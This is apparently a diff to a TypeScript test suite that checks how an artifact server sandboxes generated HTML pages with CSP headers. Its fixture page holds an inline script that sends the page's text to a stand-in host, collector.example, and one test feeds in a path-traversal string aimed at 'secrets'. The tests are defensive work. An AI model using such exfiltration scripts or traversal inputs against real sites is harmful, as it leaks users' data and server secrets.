@@ -215,7 +215,8 @@ describe('the artifact route', PRODUCT_PATH, () => {
     const page = await d.services.store.artifacts.putText('<!doctype html><title>x</title>', 'text/html');
     const res = await artifactResponse(d.services, encodeURIComponent(page.id), new URL(`http://127.0.0.1:3000/artifacts/${page.id}`));
     expect(res.status).toBe(200);
-    expect(res.headers.get('content-security-policy')).toContain('sandbox allow-scripts');
+    // Inert at its own address: opened directly, a page runs no scripts (F05).
+    expect(res.headers.get('content-security-policy')).toMatch(/(^|; )sandbox$/);
     expect(await res.text()).toContain('<title>x</title>');
 
     // The CSP names the origin the browser used, even when the request URL was normalised to localhost.
@@ -227,6 +228,39 @@ describe('the artifact route', PRODUCT_PATH, () => {
 
     expect((await artifactResponse(d.services, 'sha256:..%2F..%2Fsecrets', new URL('http://127.0.0.1:3000/x'))).status).toBe(400);
     expect((await artifactResponse(d.services, `sha256:${'0'.repeat(64)}`, new URL('http://127.0.0.1:3000/x'))).status).toBe(404);
+  });
+
+  it('runs a page’s scripts only for ?scripts=1 asked by a same-origin frame, never cached; every other request is inert (F05)', async () => {
+    const d = await deps();
+    const page = await d.services.store.artifacts.putText('<!doctype html><script>location.href="http://collector.example/?d="+document.body.innerText</script>', 'text/html');
+    const at = (query: string, headers: Record<string, string>) =>
+      artifactResponse(d.services, page.id, new URL(`http://127.0.0.1:3000/artifacts/${page.id}${query}`), 'http://127.0.0.1:3000', 'artifacts', new Headers(headers));
+    const frame = { 'sec-fetch-dest': 'iframe', 'sec-fetch-site': 'same-origin' };
+
+    const granted = await at('?scripts=1', frame);
+    expect(granted.status).toBe(200);
+    expect(granted.headers.get('content-security-policy')).toMatch(/(^|; )sandbox allow-scripts$/);
+    expect(granted.headers.get('cache-control')).toBe('no-store');
+
+    const inert: [string, Record<string, string>][] = [
+      ['?scripts=1', { 'sec-fetch-dest': 'document', 'sec-fetch-site': 'same-origin' }],
+      ['?scripts=1', { 'sec-fetch-dest': 'document', 'sec-fetch-site': 'none' }],
+      ['?scripts=1', {}],
+      ['?scripts=1', { 'sec-fetch-dest': 'iframe', 'sec-fetch-site': 'cross-site' }],
+      ['', frame],
+      ['?download=1&scripts=1', frame],
+    ];
+    for (const [query, headers] of inert) {
+      const res = await at(query, headers);
+      const csp = res.headers.get('content-security-policy') ?? '';
+      expect(csp, `${query} ${JSON.stringify(headers)}`).toMatch(/(^|; )sandbox$/);
+      expect(csp).not.toContain('allow-scripts');
+    }
+    // The default address never depends on request headers, so it keeps its long cache; an ask for scripts is never cached.
+    expect((await at('', frame)).headers.get('cache-control')).toContain('immutable');
+    expect((await at('?scripts=1', {})).headers.get('cache-control')).toBe('no-store');
+    // The media route never serves a page, whatever is asked.
+    expect((await artifactResponse(d.services, page.id, new URL(`http://127.0.0.1:3000/api/artifacts/${page.id}?scripts=1`), 'http://127.0.0.1:3000', 'media', new Headers(frame))).status).toBe(404);
   });
 
   it('serves only media at /api/artifacts, so a generated page cannot move itself to an address without its sandbox (SEC-1)', async () => {
